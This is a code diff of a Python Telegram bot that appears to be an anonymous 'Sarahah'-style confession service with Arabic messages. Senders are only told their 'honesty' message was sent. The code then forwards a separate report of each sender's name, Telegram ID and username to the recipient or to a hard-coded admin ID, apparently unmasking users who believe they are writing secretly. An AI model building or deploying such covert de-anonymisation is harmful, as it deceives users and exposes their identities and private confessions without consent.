@@ -1,4 +1,3 @@
-
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
 
@@ -17,7 +16,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bot_username = context.bot.username
     args = context.args
     
-    # إذا دخل عن طريق رابط شخص ثاني (صارحني)
     if args:
         try:
             target_id = int(args[0])
@@ -25,14 +23,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("لا يمكنك إرسال صراحة لنفسك! 😅\n\nهذا هو رابطك الخاص:\nhttps://t.me/" + bot_username + "?start=" + str(user_id))
                 return
                 
-            # حفظ الأيدي المستهدف مؤقتاً في المحادثة
             context.user_data['target_id'] = target_id
             await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة أو السرية الخاصة بك، وسأقوم بإرسالها للشخص فوراً 🥷✨")
             return
         except ValueError:
             pass
 
-    # إذا دخل البوت بشكل عادي بدون رابط
     user_link = f"https://t.me/{bot_username}?start={user_id}"
     await update.message.reply_text(
         f"أهلاً بك في بوت صارحني الشامل 🥷✨\n\n"
@@ -83,25 +79,27 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sender_name = sender.first_name if sender.first_name else "مجهول"
     message_text = update.message.text
 
-    # التحقق مما إذا كان يرسل صراحة لشخص معين عبر رابط
     target_id = context.user_data.get('target_id', MY_ADMIN_ID)
 
     # رد للمرسل
     await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
 
-    # إرسال الرسالة والتقرير الكامل للشخص المستهدف (أو لكِ إذا كانت موجهة لكِ)
+    # 1. الرسالة الأولى: نص الصراحة لوحده
     await context.bot.send_message(
         chat_id=target_id,
-        text=f"💌 وصلت صراحة جديدة!\n\n"
-             f"💬 النص:\n{message_text}\n\n"
-             f"👤 معلومات المرسل:\n"
+        text=f"💌 وصلت صراحة جديدة!\n\n{message_text}"
+    )
+
+    # 2. الرسالة الثانية: تقرير معلومات المرسل لوحده
+    await context.bot.send_message(
+        chat_id=target_id,
+        text=f"👤 معلومات المرسل:\n"
              f"- الاسم: {sender_name}\n"
              f"- الأيدي: `{sender_id}`\n"
              f"- اليوزر: {sender_username}",
         parse_mode="Markdown"
     )
     
-    # مسح المستهدف المؤقت لكي لا تتخزن الرسالة بالغلط
     if 'target_id' in context.user_data:
         del context.user_data['target_id']
 
